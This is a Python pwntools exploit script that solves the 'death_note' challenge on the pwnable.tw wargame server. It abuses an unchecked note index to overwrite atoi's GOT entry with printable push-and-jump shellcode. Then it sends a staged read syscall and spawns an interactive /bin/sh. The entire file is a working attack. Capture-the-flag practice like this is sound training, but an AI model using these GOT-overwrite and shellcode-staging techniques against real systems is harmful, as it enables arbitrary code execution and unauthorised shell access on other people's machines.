from pwn import *
context.log_level="debug"
#conn=process("./death_note")
conn=remote("chall.pwnable.tw",10201)
elf=ELF("./death_note")

def add_name(index,name):
	conn.sendlineafter("Your choice :","1")
	conn.sendlineafter("Index :",str(index))
	conn.sendlineafter("Name :",name)
	conn.recvuntil("Done !")

for i in range(221):
	add_name(1,"a"*0x4f)

index=(elf.got["atoi"]-elf.symbols["note"])/4

# P    : push eax
# 7e24 : jmp to $pc+0x24 --> c3 (ret) it's a part of heap chunk size
# then we will jmp to stack 
code="P"*0x2f+"\x7e\x24"+"P"*0x1d

add_name(index,code)

# read shellcode to stack
code="""
	xor eax,eax
	xor edx,edx
	mov al,3
	mov dl,0x40
	int 0x80
"""
read_shell_code=asm(code,arch="i386")
conn.sendlineafter("Your choice :",read_shell_code)
conn.sendline(read_shell_code+asm(shellcraft.sh()))
conn.interactive()
